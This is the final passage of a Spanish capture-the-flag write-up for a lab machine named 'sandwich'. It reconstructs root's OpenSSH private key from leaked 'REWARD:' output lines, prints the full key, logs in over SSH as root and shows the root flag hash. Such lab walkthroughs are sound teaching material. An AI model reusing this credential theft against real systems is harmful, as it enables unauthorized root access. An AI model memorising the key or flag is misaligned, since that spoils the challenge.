REWARD: I7nS3nsGgro0LxFegq4lNK/J0hOxdr0AzYCA0V1URBAc7F1yeIVsfw5agUBctTIETh4vb2
qbXz8zkaUCs3OxD+29tm759C9VV06EghvPGsNLQCNxhUJQADl+alhof4JLgaNsGSAjD0+E
REWARD: qbXz8zkaUCs3OxD+29tm759C9VV06EghvPGsNLQCNxhUJQADl+alhof4JLgaNsGSAjD0+E
BbrBjxfJ/Thc+/TRnUgi02VXBvEN3lEPPSykgnkrH05sJy3bkkypcSzrhu56I8xH2JNktD
REWARD: BbrBjxfJ/Thc+/TRnUgi02VXBvEN3lEPPSykgnkrH05sJy3bkkypcSzrhu56I8xH2JNktD
KI7CKEYAOb49G7AAABAQDjtfviGpDjQvFu/a3ftuJTO0jOfMi0KUC4D8gtX0RuLX9kx4en
REWARD: KI7CKEYAOb49G7AAABAQDjtfviGpDjQvFu/a3ftuJTO0jOfMi0KUC4D8gtX0RuLX9kx4en
99te7snBHk667wwOWg1Obo4OKuVQPbI9GpxfP8ExnSBCj7ul6pHTGrHYoKDXFkGE38LdTx
REWARD: 99te7snBHk667wwOWg1Obo4OKuVQPbI9GpxfP8ExnSBCj7ul6pHTGrHYoKDXFkGE38LdTx
vMEEyqhFiqNIv9iJUMfrZf4WcOWTl+rtJus3xz8yEjxJ+8CXNb3DSGD2AN2my4gmXuSJec
REWARD: vMEEyqhFiqNIv9iJUMfrZf4WcOWTl+rtJus3xz8yEjxJ+8CXNb3DSGD2AN2my4gmXuSJec
Q3j0qy5I0191AjSaySmfOvFTdXk/2CHq2BiPDyrvZBoJC1/Uo34IJzv7KniWETOn1pXQyW
REWARD: Q3j0qy5I0191AjSaySmfOvFTdXk/2CHq2BiPDyrvZBoJC1/Uo34IJzv7KniWETOn1pXQyW
5e4Z60iiIePJTiXy32FP1CkMfFCqrnCf6vUh7u5/cogU9EFCFxfEcAagP0OMU3pu8stWpw
REWARD: 5e4Z60iiIePJTiXy32FP1CkMfFCqrnCf6vUh7u5/cogU9EFCFxfEcAagP0OMU3pu8stWpw
r1QiwDaFhL5nAAAADXJvb3RAc2FuZHdpY2gBAgMEBQ==
REWARD: r1QiwDaFhL5nAAAADXJvb3RAc2FuZHdpY2gBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
REWARD: -----END OPENSSH PRIVATE KEY-----
```

Despues de unos segundo podremos ver que ha funcionado, por lo que vamos a limpiarlo para dejarlo bien el `id_rsa`.

> id\_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Ahora vamos a conectarnos por `SSH` con dicha clave.

```shell
chmod 600 id_rsa
ssh -i id_rsa root@<IP>
```

Info:

```
Linux sandwich 6.1.0-32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 30 20:14:35 2025 from 192.168.1.181
root@sandwich:~# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` del `root`.

> root.txt

```
a4e728e6ffc502beea7570a75348af44
```
